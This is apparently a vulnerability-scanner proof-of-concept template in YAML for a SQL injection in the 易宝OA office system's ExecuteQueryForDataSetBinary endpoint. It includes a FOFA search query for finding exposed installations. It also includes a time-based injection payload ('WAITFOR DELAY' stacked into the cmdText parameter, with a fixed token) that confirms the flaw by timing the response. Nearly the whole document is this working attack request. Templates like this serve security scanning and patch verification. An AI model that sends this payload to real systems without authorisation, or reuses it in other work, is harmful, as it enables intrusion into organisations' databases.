id: poc-yaml-yi-bao-oa-system-executequeryfordatasetbinary-sqli
info:
  name: 易宝OA系统 ExecuteQueryForDataSetBinary SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易宝OA
  fofa: body="欢迎登录易宝OA系统"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"欢迎登录易宝OA系统")
- method: POST
  path: /api/system/ExecuteQueryForDataSetBinary
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: token=zxh&cmdText=;WAITFOR DELAY '0:0:{{.t1}}'--+
  expression: status_code == 200 && contains(body,"\"message\":\"success\"") && contains(body,"\"is_succeed\":true")
    && contains(content_type,"application/json") && duration > t1 && duration < t2
transport: http
